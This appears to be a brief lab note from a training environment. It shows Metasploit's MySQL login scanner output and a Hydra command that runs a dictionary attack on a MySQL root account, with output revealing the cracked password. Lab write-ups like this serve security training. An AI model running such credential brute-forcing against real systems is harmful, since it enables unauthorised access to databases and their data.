# Dictionary Attack

Metasploit

```
[+] 192.127.56.3:3306     - 192.127.56.3:3306 - Success: 'root:catalina'
[*] 192.127.56.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) >
```

Hydra

```
root@attackdefense:~# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.127.56.3 mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-25 22:53:15
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.127.56.3:3306/

[3306][mysql] host: 192.127.56.3   login: root   password: catalina
1 of 1 target successfully completed, 1 valid password found
```
